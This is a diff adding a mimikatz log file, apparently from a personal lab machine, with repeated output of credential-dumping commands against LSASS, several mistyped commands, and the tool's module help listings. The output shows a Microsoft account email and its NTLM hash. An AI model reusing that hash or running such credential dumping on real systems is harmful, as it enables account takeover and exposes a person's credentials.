@@ -1,0 +1,2622 @@
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logpasswords
+ERROR mimikatz_doLocal ; "logpasswords" command of "sekurlsa" module not found !
+
+Module :	sekurlsa
+Full name :	SekurLSA module
+Description :	Some commands to enumerate credentials...
+
+             msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
+             pth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekuralsa::logpasswords
+ERROR mimikatz_doLocal ; "sekuralsa" module not found !
+
+        standard  -  Standard module  [Basic commands (does not require module name)]
+          crypto  -  Crypto Module
+        sekurlsa  -  SekurLSA module  [Some commands to enumerate credentials...]
+        kerberos  -  Kerberos package module  []
+       privilege  -  Privilege module
+         process  -  Process module
+         service  -  Service module
+         lsadump  -  LsaDump module
+              ts  -  Terminal Server module
+           event  -  Event module
+            misc  -  Miscellaneous module
+           token  -  Token manipulation module
+           vault  -  Windows Vault/Credential module
+     minesweeper  -  MineSweeper module
+             net  -  
+           dpapi  -  DPAPI Module (by API or RAW access)  [Data Protection application programming interface]
+       busylight  -  BusyLight Module
+          sysenv  -  System Environment Value module
+             sid  -  Security Identifiers module
+             iis  -  IIS XML Config module
+             rpc  -  RPC control of mimikatz
+            sr98  -  RF module for SR98 device and T5577 target
+             rdm  -  RF module for RDM(830 AL) device
+             acr  -  ACR Module
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logpasswords
+ERROR mimikatz_doLocal ; "logpasswords" command of "sekurlsa" module not found !
+
+Module :	sekurlsa
+Full name :	SekurLSA module
+Description :	Some commands to enumerate credentials...
+
+             msv  -  Lists LM & NTLM credentials
+         wdigest  -  Lists WDigest credentials
+        kerberos  -  Lists Kerberos credentials
+           tspkg  -  Lists TsPkg credentials
+         livessp  -  Lists LiveSSP credentials
+             ssp  -  Lists SSP credentials
+  logonPasswords  -  Lists all available providers credentials
+         process  -  Switch (or reinit) to LSASS process  context
+        minidump  -  Switch (or reinit) to LSASS minidump context
+         bootkey  -  Set the SecureKernel Boot Key to attempt to decrypt LSA Isolated credentials
+             pth  -  Pass-the-hash
+          krbtgt  -  krbtgt!
+     dpapisystem  -  DPAPI_SYSTEM secret
+           trust  -  Antisocial
+      backupkeys  -  Preferred Backup Master keys
+         tickets  -  List Kerberos tickets
+           ekeys  -  List Kerberos Encryption Keys
+           dpapi  -  List Cached MasterKeys
+         credman  -  List Credentials Manager
+
+mimikatz # sekurlsa::msv
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+
+mimikatz # exit
+Bye!
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::msv
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:37 AM
+SID               : 
+	msv :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:36 AM
+SID               : S-1-5-18
+	msv :	
+
+mimikatz # Using 'mimikatz.log' for logfile : OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5590860 (00000000:00554f4c)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 5590744 (00000000:00554ed8)
+Session           : Interactive from 1
+User Name         : cyber
+Domain            : DESKTOP-GKF876S
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:57:03 AM
+SID               : S-1-5-21-2361797404-2610985929-2571959900-1001
+	msv :	
+	 [00000003] Primary
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * NTLM     : 4dcb59495f96a09b540f92340e0ef403
+	tspkg :	
+	wdigest :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	kerberos :	
+	 * Username : cyberanalyst21@gmail.com
+	 * Domain   : MicrosoftAccount
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:45 AM
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54637 (00000000:0000d56d)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 54613 (00000000:0000d555)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:44 AM
+SID               : S-1-5-90-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : DESKTOP-GKF876S$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:40 AM
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : desktop-gkf876s$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33136 (00000000:00008170)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-0
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 33137 (00000000:00008171)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 7/31/2025 10:33:38 AM
+SID               : S-1-5-96-0-1
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : DESKTOP-GKF876S$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	ssp :	KO
+	credman :	
+
+Authentication Id : 0 ; 32092 (00000000:00007d5c)
+Session           : UndefinedLogonType from 0
